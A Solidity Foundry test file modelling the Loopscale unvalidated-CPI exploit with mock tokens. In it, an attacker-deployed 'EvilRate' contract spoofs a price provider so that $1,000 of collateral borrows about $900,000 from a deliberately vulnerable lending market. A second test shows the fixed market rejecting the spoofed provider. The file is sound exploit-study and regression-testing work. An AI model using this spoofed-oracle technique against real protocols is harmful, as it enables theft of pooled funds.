// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {
    VulnerableLendingMarket,
    SafeLendingMarket,
    IERC20,
    IRateProvider
} from "../src/loopscale-cpi/LendingMarket.sol";

/// PoC for Loopscale's unvalidated-CPI exploit (2025-04-26, $5.8M).
///   forge test --match-contract LoopscaleCpi -vvv
///
/// EVM model of a Solana unvalidated-CPI-target bug. Invariant that SHOULD hold
/// (master-checklist SC05): all cross-program calls target a known, validated program.
/// The attack breaks it: a spoofed rate provider returns an inflated PT price, enabling
/// a massively undercollateralized loan.
///
/// See docs/exploits/loopscale-ratex-pricing-2025-04-26.md

/// The honest RateX provider: PT trades near $1.
contract HonestRate is IRateProvider {
    function getRate() external pure returns (uint256) {
        return 1e18;
    }
}

/// Attacker-deployed program spoofing the RateX interface, reporting PT at $1,000.
contract EvilRate is IRateProvider {
    function getRate() external pure returns (uint256) {
        return 1000e18;
    }
}

contract LoopscaleCpiTest is Test {
    MockERC20 usdc;
    MockERC20 pt;
    HonestRate honest;

    address attacker = makeAddr("attacker");

    uint256 constant RESERVE = 1_000_000e18;
    uint256 constant COLLATERAL = 1_000e18; // worth ~$1,000 honestly

    function setUp() public {
        usdc = new MockERC20();
        pt = new MockERC20();
        honest = new HonestRate();
        pt.mint(attacker, COLLATERAL);
    }

    function test_vulnerableMarket_spoofedRateOverBorrows() public {
        VulnerableLendingMarket market =
            new VulnerableLendingMarket(IERC20(address(usdc)), IERC20(address(pt)));
        usdc.mint(address(market), RESERVE);

        EvilRate evil = new EvilRate();

        vm.startPrank(attacker);
        pt.approve(address(market), type(uint256).max);
        market.borrow(COLLATERAL, evil); // PT valued at 1000x via spoofed provider
        vm.stopPrank();

        // ~$1,000 of real collateral borrowed ~$900,000 (1000x inflated, 90% LTV).
        uint256 borrowed = usdc.balanceOf(attacker);
        console2.log("USDC borrowed against $1k collateral:", borrowed / 1e18);
        assertEq(borrowed, (COLLATERAL * 1000 * 9000) / 10000, "1000x over-borrow");
        assertGt(borrowed, COLLATERAL * 100, "wildly undercollateralized");
    }

    function test_safeMarket_rejectsSpoofedProvider() public {
        SafeLendingMarket market =
            new SafeLendingMarket(IERC20(address(usdc)), IERC20(address(pt)), honest);
        usdc.mint(address(market), RESERVE);

        EvilRate evil = new EvilRate();

        vm.startPrank(attacker);
        pt.approve(address(market), type(uint256).max);
        vm.expectRevert(bytes("untrusted rate provider"));
        market.borrow(COLLATERAL, evil);
        vm.stopPrank();

        assertEq(usdc.balanceOf(attacker), 0, "no funds borrowed via spoofed provider");
    }
}
